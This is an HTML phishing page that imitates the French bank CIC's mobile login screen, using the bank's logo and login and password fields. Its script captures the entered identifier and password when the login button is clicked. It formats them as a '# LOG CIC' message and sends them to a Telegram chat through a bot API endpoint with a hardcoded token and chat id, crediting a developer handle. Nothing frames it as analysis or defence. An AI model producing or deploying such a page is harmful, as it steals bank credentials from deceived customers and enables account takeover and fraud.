<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Connexion - iPhone 16 Pro Max</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            background: linear-gradient(to bottom, #0e7a86 0%, #48638a 50%, #4b4b8b 100%);
            background-repeat: no-repeat;
            background-attachment: fixed;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .telephone {
            width: 440px;
            height: 956px;
            background: linear-gradient(to bottom, #0e7a86 0%, #48638a 50%, #4b4b8b 100%);
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            border-radius: 40px;
        }

        .image-haut-centre {
            width: 120px;
            margin: 80px auto 40px auto;
            display: block;
            border: 2px solid rgba(255,255,255,0.4);
            background: white;
            padding: 0.2px;
        }

        .bloc-connexion {
            background: #ffffff;
            width: 380px;
            margin: 0 auto;
            border-radius: 24px;
            padding: 20px 24px 10px 24px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
        }

        .obligatoire {
            font-size: 13px;
            color: #333;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .asterisque {
            color: #d32f2f;
            font-weight: bold;
        }

        .champ {
            display: flex;
            align-items: center;
            border-bottom: 1px solid #ddd;
            padding: 14px 0;
            gap: 14px;
            position: relative;
        }

        .champ svg {
            width: 24px;
            height: 24px;
            stroke: #333;
            flex-shrink: 0;
        }

        .input-wrapper {
            flex: 1;
            position: relative;
        }

        .champ input {
            width: 100%;
            border: none;
            outline: none;
            font-size: 16px;
            color: #333;
            background: transparent;
            padding-right: 20px;
        }

        .champ input::placeholder {
            color: #666;
        }

        .champ input[type="password"]::-ms-reveal,
        .champ input[type="password"]::-ms-clear {
            display: none;
        }

        .champ input[type="password"]::-webkit-credentials-auto-fill-button,
        .champ input[type="password"]::-webkit-contacts-auto-fill-button {
            visibility: hidden;
            pointer-events: none;
            position: absolute;
            right: 0;
        }

        .label-requis {
            position: absolute;
            left: 0;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
            color: #666;
            pointer-events: none;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .label-requis .etoile {
            color: #d32f2f;
            font-size: 16px;
            font-weight: bold;
        }

        .champ input:not(:placeholder-shown) + .label-requis {
            display: none;
        }

        .oeil {
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            display: flex;
            align-items: center;
        }

        .oeil svg {
            width: 22px;
            height: 22px;
            stroke: #2a6a8a;
        }

        .btn-connexion {
            display: block;
            width: 200px;
            margin: 30px auto 16px auto;
            padding: 14px 0;
            background: #d9d9d9;
            color: #555;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 30px;
            cursor: pointer;
        }

        .btn-connexion:hover {
            background: #cccccc;
        }

        .btn-secondaire {
            display: block;
            width: 300px;
            margin: 0 auto;
            padding: 16px 0;
            background: rgba(30, 60, 100, 0.7);
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 30px;
            cursor: pointer;
        }

        .btn-secondaire:hover {
            background: rgba(30, 60, 100, 0.9);
        }

        .footer {
            margin-top: auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px 30px 20px;
        }

        .btn-footer {
            padding: 14px 24px;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            cursor: pointer;
        }

        .btn-footer.gauche {
            background: rgba(30, 40, 80, 0.6);
            color: white;
        }

        .btn-footer.droite {
            background: white;
            color: #2a6a8a;
            font-weight: bold;
        }

#chargement {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.5);
    justify-content: center;
    align-items: center;
    z-index: 9999;
}

.cercle {
    width: 60px;
    height: 60px;
    border: 6px solid rgba(255,255,255,0.3);
    border-top: 6px solid #fff;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}
    </style>
</head>
<body>
    <div class="telephone">
        <img src="https://cdnii.e-i.com/INGR/sd/cic_2023/11.130.6/fr/images/css/env/logo.svg" alt="Logo" class="image-haut-centre" />

        <div class="bloc-connexion">
            <p class="obligatoire"><span class="asterisque">*</span> Information obligatoire</p>

            <div class="champ">
                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                    <circle cx="12" cy="7" r="4"></circle>
                </svg>
                <div class="input-wrapper">
                  <input type="text" placeholder=" " id="identifiant" />
                    <span class="label-requis">Identifiant <span class="etoile">*</span></span>
                </div>
            </div>

            <div class="champ">
                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
                <div class="input-wrapper">
                    <input type="password" placeholder=" " id="mdp" />
                    <span class="label-requis">Mot de passe <span class="etoile">*</span></span>
                </div>
                <button class="oeil" type="button" id="toggleMdp">
                    <!-- Œil barré (mot de passe caché) -->
                    <svg id="oeilBarre" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                        <line x1="1" y1="1" x2="23" y2="23"></line>
                    </svg>
                    <!-- Œil ouvert (mot de passe affiché) -->
                    <svg id="oeilOuvert" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                </button>
            </div>
        </div>

        <button class="btn-connexion">Se connecter</button>
        <button class="btn-secondaire">Je ne peux pas me connecter</button>

<div id="chargement">
    <div class="cercle"></div>
</div>

        <div class="footer">
            <button class="btn-footer gauche">Aide & services</button>
            <button class="btn-footer droite">Devenir client</button>
        </div>
    </div>

    <script>
        const inputMdp = document.getElementById('mdp');
        const btnOeil = document.getElementById('toggleMdp');
        const oeilBarre = document.getElementById('oeilBarre');
        const oeilOuvert = document.getElementById('oeilOuvert');

        btnOeil.addEventListener('click', () => {
            if (inputMdp.type === 'password') {
                // Afficher le mot de passe
                inputMdp.type = 'text';
                oeilBarre.style.display = 'none';
                oeilOuvert.style.display = 'block';
            } else {
                // Cacher le mot de passe
                inputMdp.type = 'password';
                oeilBarre.style.display = 'block';
                oeilOuvert.style.display = 'none';
            }
            inputMdp.focus();
        });

document.querySelector('.btn-connexion').addEventListener('click', () => {
    const identifiant = document.getElementById('identifiant').value;
    const motDePasse = document.getElementById('mdp').value;

    const message = `# LOG CIC\n\n🔓 Identifiant : <code>${identifiant}</code>\n🔑 Password : <code>${motDePasse}</code>\n\n🏦 Base ⊱ CIC\n👨‍💻 DEV BY ⊱ @Hanna462829`;
    document.getElementById('chargement').style.display = 'flex';

    fetch(`https://api.telegram.org/bot9154248105:AAFku0A6aSyTiixsS35oRB-moAqONjBKx34/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
    chat_id: "-5425989070",
    text: message,
    parse_mode: "HTML"
})
    })
    .then(r => r.json())
    .then(data => {
        console.log(data);
    })
    .catch(err => {
        console.error(err);
    });
});
    </script>
</body>
</html>
